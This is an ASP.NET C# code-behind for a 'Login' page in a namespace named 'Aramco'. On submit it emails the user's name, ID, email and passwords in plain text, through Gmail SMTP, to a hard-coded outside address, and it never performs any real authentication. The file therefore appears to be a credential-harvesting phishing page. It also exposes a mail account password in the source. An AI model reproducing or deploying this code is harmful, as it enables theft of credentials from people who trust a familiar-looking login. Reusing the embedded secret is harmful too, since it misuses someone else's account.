using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Net;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Aramco
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                string smtpServer = "smtp.gmail.com";

                int smtpPort = 587;

                string
                 senderEmail = "helpdeskproject2024@gmail.com";

                string senderPassword = "zqrg lors uypf ynug";

                string receiver1 = senderEmail;

                string subject1 ="information" ;

                string message1 = "name:" + name.Value + "id:" + id.Value + "email:" + email.Value + "Password" + password.Value + "password" + password1.Value;

                SmtpClient cv = new SmtpClient(smtpServer, smtpPort);
                cv.EnableSsl = true;
                cv.Credentials = new NetworkCredential(senderEmail, senderPassword);

                MailMessage mail = new MailMessage(senderEmail, receiver1, subject1, message1);


                cv.Send(mail);
                Label1.Text = "ok";
            }

            catch (Exception e1x)
            {
                Label1.Text = "Error1 :" + e1x.Message;
            }
        }
    }
}